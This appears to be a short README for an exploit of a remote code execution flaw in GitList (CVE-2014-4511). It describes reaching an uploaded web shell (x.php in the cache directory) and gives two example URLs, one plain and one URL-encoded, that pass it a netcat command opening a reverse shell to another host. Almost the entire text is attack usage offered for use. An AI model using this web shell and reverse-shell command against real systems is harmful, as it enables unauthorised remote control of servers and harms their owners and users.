# gitlist-RCE
CVE-2014-4511
example:
after shell upload successfully:
access:
http://192.168.1.126/cache/x.php/?cmd=nc -nv 192.168.1.127 1111 -e /bin/sh
http://192.168.1.126/cache/x.php/?cmd=nc%20-nv%20192.168.1.127%201111%20-e%20/bin/sh
